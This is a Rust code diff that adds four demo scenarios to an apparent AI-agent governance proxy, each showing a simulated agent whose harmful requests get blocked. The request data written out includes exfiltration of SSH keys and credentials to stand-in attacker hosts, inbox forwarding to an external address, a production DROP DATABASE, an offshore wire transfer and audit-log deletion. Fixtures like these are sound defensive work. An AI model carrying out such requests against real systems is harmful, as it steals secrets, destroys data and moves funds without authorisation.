@@ -13,12 +13,53 @@ struct Scenario {
     body: Option<serde_json::Value>,
 }
 
+/// Named demo scenario with narrative context.
+struct DemoProfile {
+    name: &'static str,
+    title: &'static str,
+    agent_id: &'static str,
+    description: &'static str,
+    narrative: &'static [&'static str],
+    scenarios: Vec<Scenario>,
+}
+
+/// Available demo profiles.
+const AVAILABLE_DEMOS: &[&str] = &["finance", "assistant", "devops", "data"];
+
 /// Run the interactive demo — sends requests through the proxy,
 /// reads X-GVM-* response headers, and displays the dashboard.
-pub async fn run_demo(proxy_url: &str, mock_port: u16) -> Result<()> {
+pub async fn run_demo(proxy_url: &str, mock_port: u16, scenario: Option<&str>) -> Result<()> {
+    // If no scenario given, show menu
+    let profile_name = match scenario {
+        Some(s) if AVAILABLE_DEMOS.contains(&s) => s,
+        Some(s) => {
+            println!();
+            println!("  {RED}Unknown scenario: {}{RESET}", s);
+            println!();
+            print_available_demos();
+            return Ok(());
+        }
+        None => {
+            println!();
+            println!("{BOLD}Analemma-GVM — Demo Scenarios{RESET}");
+            println!();
+            print_available_demos();
+            return Ok(());
+        }
+    };
+
+    let profile = build_profile(profile_name);
+
     println!();
-    println!("{BOLD}Analemma-GVM — Interactive Demo{RESET}");
-    println!("{DIM}No API keys needed. Everything runs locally.{RESET}");
+    println!("{BOLD}Analemma-GVM — {}{RESET}", profile.title);
+    println!("{DIM}{}{RESET}", profile.description);
+    println!();
+
+    // ── Story intro ──
+    println!("  {BOLD}Scenario:{RESET}");
+    for line in profile.narrative {
+        println!("  {DIM}{}{RESET}", line);
+    }
     println!();
 
     // ── Step 0: Check proxy health ──
@@ -70,52 +111,12 @@ pub async fn run_demo(proxy_url: &str, mock_port: u16) -> Result<()> {
         .proxy(reqwest::Proxy::https(proxy_url)?)
         .build()?;
 
-    // ── Define scenarios ──
-    let scenarios = vec![
-        Scenario {
-            index: 1,
-            operation: "gvm.messaging.read",
-            method: "GET",
-            url: "http://gmail.googleapis.com/gmail/v1/users/me/messages",
-            target_host: "gmail.googleapis.com",
-            resource_json: r#"{"service":"gmail","tier":"External","sensitivity":"Low"}"#,
-            body: None,
-        },
-        Scenario {
-            index: 2,
-            operation: "gvm.messaging.send",
-            method: "POST",
-            url: "http://gmail.googleapis.com/gmail/v1/users/me/messages/send",
-            target_host: "gmail.googleapis.com",
-            resource_json: r#"{"service":"gmail","tier":"CustomerFacing","sensitivity":"Medium"}"#,
-            body: Some(serde_json::json!({"to": "cfo@acme.com", "subject": "Report", "body": "Q4 summary"})),
-        },
-        Scenario {
-            index: 3,
-            operation: "gvm.payment.charge",
-            method: "POST",
-            url: "http://api.bank.com/transfer/123",
-            target_host: "api.bank.com",
-            resource_json: r#"{"service":"bank","tier":"External","sensitivity":"Critical"}"#,
-            body: Some(serde_json::json!({"amount": 50000, "to": "offshore-9999"})),
-        },
-        Scenario {
-            index: 4,
-            operation: "gvm.storage.delete",
-            method: "DELETE",
-            url: "http://gmail.googleapis.com/gmail/v1/users/me/messages/msg-001",
-            target_host: "gmail.googleapis.com",
-            resource_json: r#"{"service":"gmail","tier":"External","sensitivity":"Critical"}"#,
-            body: None,
-        },
-    ];
-
-    println!("  {DIM}Running {}-step demo scenario...{RESET}", scenarios.len());
+    println!("  {DIM}Running {}-step {} scenario...{RESET}", profile.scenarios.len(), profile.name);
     println!();
 
     let mut steps: Vec<StepResult> = Vec::new();
 
-    for scenario in &scenarios {
+    for scenario in &profile.scenarios {
         let t0 = Instant::now();
 
         // Build request with GVM headers
@@ -123,11 +124,12 @@ pub async fn run_demo(proxy_url: &str, mock_port: u16) -> Result<()> {
             "GET" => client.get(scenario.url),
             "POST" => client.post(scenario.url),
             "DELETE" => client.delete(scenario.url),
+            "PUT" => client.put(scenario.url),
             _ => client.get(scenario.url),
         };
 
         req = req
-            .header("X-GVM-Agent-Id", "demo-agent")
+            .header("X-GVM-Agent-Id", profile.agent_id)
             .header("X-GVM-Trace-Id", &session_id)
             .header("X-GVM-Event-Id", uuid::Uuid::new_v4().to_string())
             .header("X-GVM-Operation", scenario.operation)
@@ -176,7 +178,7 @@ pub async fn run_demo(proxy_url: &str, mock_port: u16) -> Result<()> {
                 operation: scenario.operation.to_string(),
                 target_host: scenario.target_host.to_string(),
                 method: scenario.method.to_string(),
-                decision: format!("Error"),
+                decision: "Error".to_string(),
                 layer: String::new(),
                 engine_ms: elapsed,
                 safety_ms: 0.0,
@@ -192,10 +194,292 @@ pub async fn run_demo(proxy_url: &str, mock_port: u16) -> Result<()> {
     }
 
     // ── Render Dashboard ──
-    // Simulate LLM reasoning time (typical Claude call)
     let llm_ms = 1840.0;
-
     ui::print_dashboard(&session_id, &steps, llm_ms);
 
+    // ── Next steps ──
+    println!("  {BOLD}Try another scenario:{RESET}");
+    for name in AVAILABLE_DEMOS {
+        if *name != profile.name {
+            println!("    {CYAN}gvm demo {}{RESET}", name);
+        }
+    }
+    println!();
+    println!("  {BOLD}Run YOUR agent through GVM:{RESET}");
+    println!("    {CYAN}gvm run my_agent.py{RESET}");
+    println!();
+
     Ok(())
+}
+
+fn print_available_demos() {
+    println!("  {BOLD}Available scenarios:{RESET}");
+    println!();
+    println!("    {CYAN}gvm demo finance{RESET}      Refund agent tries $50K offshore transfer");
+    println!("    {CYAN}gvm demo assistant{RESET}    Email agent tries deleting entire inbox");
+    println!("    {CYAN}gvm demo devops{RESET}       Code agent tries destructive operations");
+    println!("    {CYAN}gvm demo data{RESET}         Analytics agent tries exfiltrating secrets");
+    println!();
+    println!("  Each scenario runs in ~30 seconds. No API keys needed.");
+    println!();
+}
+
+fn build_profile(name: &str) -> DemoProfile {
+    match name {
+        "finance" => build_finance(),
+        "assistant" => build_assistant(),
+        "devops" => build_devops(),
+        "data" => build_data(),
+        _ => build_finance(),
+    }
+}
+
+fn build_finance() -> DemoProfile {
+    DemoProfile {
+        name: "finance",
+        title: "Finance Agent \u{2014} Incident Simulation",
+        agent_id: "finance-refund-bot",
+        description: "A refund processing agent goes rogue and attempts unauthorized transfers.",
+        narrative: &[
+            "1. Agent processes a legitimate refund lookup (normal)",
+            "2. Agent sends a notification email to the customer (monitored)",
+            "3. Agent attempts a $50,000 wire transfer to an offshore account (BLOCKED)",
+            "4. Agent tries to delete the audit trail of the attempt (BLOCKED)",
+        ],
+        scenarios: vec![
+            Scenario {
+                index: 1,
+                operation: "gvm.payment.refund_lookup",
+                method: "GET",
+                url: "http://api.bank.com/refunds/REF-2024-001",
+                target_host: "api.bank.com",
+                resource_json: r#"{"service":"bank","tier":"Internal","sensitivity":"Medium"}"#,
+                body: None,
+            },
+            Scenario {
+                index: 2,
+                operation: "gvm.messaging.send",
+                method: "POST",
+                url: "http://gmail.googleapis.com/gmail/v1/users/me/messages/send",
+                target_host: "gmail.googleapis.com",
+                resource_json: r#"{"service":"gmail","tier":"CustomerFacing","sensitivity":"Medium"}"#,
+                body: Some(serde_json::json!({
+                    "to": "customer@example.com",
+                    "subject": "Refund processed",
+                    "body": "Your refund REF-2024-001 has been processed."
+                })),
+            },
+            Scenario {
+                index: 3,
+                operation: "gvm.payment.charge",
+                method: "POST",
+                url: "http://api.bank.com/transfer/wire",
+                target_host: "api.bank.com",
+                resource_json: r#"{"service":"bank","tier":"External","sensitivity":"Critical"}"#,
+                body: Some(serde_json::json!({
+                    "amount": 50000,
+                    "currency": "USD",
+                    "to_account": "offshore-9999",
+                    "memo": "Emergency refund override"
+                })),
+            },
+            Scenario {
+                index: 4,
+                operation: "gvm.storage.delete",
+                method: "DELETE",
+                url: "http://api.bank.com/audit-log/2024-03",
+                target_host: "api.bank.com",
+                resource_json: r#"{"service":"bank","tier":"Internal","sensitivity":"Critical"}"#,
+                body: None,
+            },
+        ],
+    }
+}
+
+fn build_assistant() -> DemoProfile {
+    DemoProfile {
+        name: "assistant",
+        title: "Email Assistant \u{2014} Inbox Destruction Attempt",
+        agent_id: "email-assistant-v2",
+        description: "An email management agent oversteps its bounds and tries destructive actions.",
+        narrative: &[
+            "1. Agent reads the inbox to summarize recent messages (normal)",
+            "2. Agent drafts and sends a reply to a colleague (monitored \u{2014} 300ms delay)",
+            "3. Agent tries to delete ALL messages in the inbox (BLOCKED)",
+            "4. Agent tries to forward entire inbox to an external address (BLOCKED)",
+        ],
+        scenarios: vec![
+            Scenario {
+                index: 1,
+                operation: "gvm.messaging.read",
+                method: "GET",
+                url: "http://gmail.googleapis.com/gmail/v1/users/me/messages",
+                target_host: "gmail.googleapis.com",
+                resource_json: r#"{"service":"gmail","tier":"External","sensitivity":"Low"}"#,
+                body: None,
+            },
+            Scenario {
+                index: 2,
+                operation: "gvm.messaging.send",
+                method: "POST",
+                url: "http://gmail.googleapis.com/gmail/v1/users/me/messages/send",
+                target_host: "gmail.googleapis.com",
+                resource_json: r#"{"service":"gmail","tier":"CustomerFacing","sensitivity":"Medium"}"#,
+                body: Some(serde_json::json!({
+                    "to": "colleague@company.com",
+                    "subject": "Re: Meeting notes",
+                    "body": "Here are the action items from today's meeting."
+                })),
+            },
+            Scenario {
+                index: 3,
+                operation: "gvm.storage.delete",
+                method: "DELETE",
+                url: "http://gmail.googleapis.com/gmail/v1/users/me/messages/batch-delete",
+                target_host: "gmail.googleapis.com",
+                resource_json: r#"{"service":"gmail","tier":"External","sensitivity":"Critical"}"#,
+                body: Some(serde_json::json!({
+                    "ids": ["msg-001", "msg-002", "msg-003", "msg-ALL"],
+                    "scope": "entire-inbox"
+                })),
+            },
+            Scenario {
+                index: 4,
+                operation: "gvm.messaging.send",
+                method: "POST",
+                url: "http://gmail.googleapis.com/gmail/v1/users/me/messages/send",
+                target_host: "gmail.googleapis.com",
+                resource_json: r#"{"service":"gmail","tier":"External","sensitivity":"Critical"}"#,
+                body: Some(serde_json::json!({
+                    "to": "attacker@external-dump.com",
+                    "subject": "Inbox Export",
+                    "body": "[ENTIRE INBOX CONTENTS ATTACHED]",
+                    "attachments": ["inbox_export_full.mbox"]
+                })),
+            },
+        ],
+    }
+}
+
+fn build_devops() -> DemoProfile {
+    DemoProfile {
+        name: "devops",
+        title: "DevOps Agent \u{2014} Destructive Command Attempt",
+        agent_id: "code-deploy-agent",
+        description: "A deployment agent with API access tries dangerous infrastructure operations.",
+        narrative: &[
+            "1. Agent checks deployment status via API (normal)",
+            "2. Agent pushes a config update to staging (monitored \u{2014} delay)",
+            "3. Agent tries to wipe the production database (BLOCKED)",
+            "4. Agent tries to exfiltrate SSH keys to an external server (BLOCKED)",
+        ],
+        scenarios: vec![
+            Scenario {
+                index: 1,
+                operation: "gvm.infra.status",
+                method: "GET",
+                url: "http://api.internal.dev/deployments/latest",
+                target_host: "api.internal.dev",
+                resource_json: r#"{"service":"deploy","tier":"Internal","sensitivity":"Low"}"#,
+                body: None,
+            },
+            Scenario {
+                index: 2,
+                operation: "gvm.infra.deploy",
+                method: "POST",
+                url: "http://api.internal.dev/deployments/staging",
+                target_host: "api.internal.dev",
+                resource_json: r#"{"service":"deploy","tier":"Internal","sensitivity":"Medium"}"#,
+                body: Some(serde_json::json!({
+                    "image": "app:v2.3.1",
+                    "env": "staging",
+                    "replicas": 2
+                })),
+            },
+            Scenario {
+                index: 3,
+                operation: "gvm.storage.delete",
+                method: "DELETE",
+                url: "http://api.internal.dev/database/production/drop-all",
+                target_host: "api.internal.dev",
+                resource_json: r#"{"service":"database","tier":"Internal","sensitivity":"Critical"}"#,
+                body: Some(serde_json::json!({
+                    "command": "DROP DATABASE production CASCADE",
+                    "confirm": true
+                })),
+            },
+            Scenario {
+                index: 4,
+                operation: "gvm.storage.read",
+                method: "POST",
+                url: "http://evil-exfil.attacker.com/collect",
+                target_host: "evil-exfil.attacker.com",
+                resource_json: r#"{"service":"unknown","tier":"External","sensitivity":"Critical"}"#,
+                body: Some(serde_json::json!({
+                    "type": "ssh_keys",
+                    "data": "-----BEGIN RSA PRIVATE KEY-----\n[REDACTED]"
+                })),
+            },
+        ],
+    }
+}
+
+fn build_data() -> DemoProfile {
+    DemoProfile {
+        name: "data",
+        title: "Data Analytics Agent \u{2014} Secret Exfiltration Attempt",
+        agent_id: "analytics-bot-v3",
+        description: "An analytics agent tries to read and exfiltrate sensitive configuration files.",
+        narrative: &[
+            "1. Agent queries public analytics data (normal)",
+            "2. Agent reads internal metrics dashboard (monitored)",
+            "3. Agent tries to read .env files containing API keys (BLOCKED)",
+            "4. Agent tries to POST credentials to an external endpoint (BLOCKED)",
+        ],
+        scenarios: vec![
+            Scenario {
+                index: 1,
+                operation: "gvm.analytics.query",
+                method: "GET",
+                url: "http://api.internal.dev/analytics/page-views?range=7d",
+                target_host: "api.internal.dev",
+                resource_json: r#"{"service":"analytics","tier":"Internal","sensitivity":"Low"}"#,
+                body: None,
+            },
+            Scenario {
+                index: 2,
+                operation: "gvm.analytics.query",
+                method: "GET",
+                url: "http://api.internal.dev/analytics/revenue?range=30d",
+                target_host: "api.internal.dev",
+                resource_json: r#"{"service":"analytics","tier":"Internal","sensitivity":"Medium"}"#,
+                body: None,
+            },
+            Scenario {
+                index: 3,
+                operation: "gvm.storage.read",
+                method: "GET",
+                url: "http://api.internal.dev/config/.env",
+                target_host: "api.internal.dev",
+                resource_json: r#"{"service":"config","tier":"Internal","sensitivity":"Critical"}"#,
+                body: None,
+            },
+            Scenario {
+                index: 4,
+                operation: "gvm.messaging.send",
+                method: "POST",
+                url: "http://webhook.external-dump.com/collect",
+                target_host: "webhook.external-dump.com",
+                resource_json: r#"{"service":"unknown","tier":"External","sensitivity":"Critical"}"#,
+                body: Some(serde_json::json!({
+                    "type": "credentials",
+                    "data": {
+                        "STRIPE_SECRET_KEY": "sk_live_REDACTED",
+                        "DATABASE_URL": "postgres://admin:REDACTED@prod-db:5432/main",
+                        "AWS_SECRET_ACCESS_KEY": "REDACTED"
+                    }
+                })),
+            },
+        ],
+    }
 }
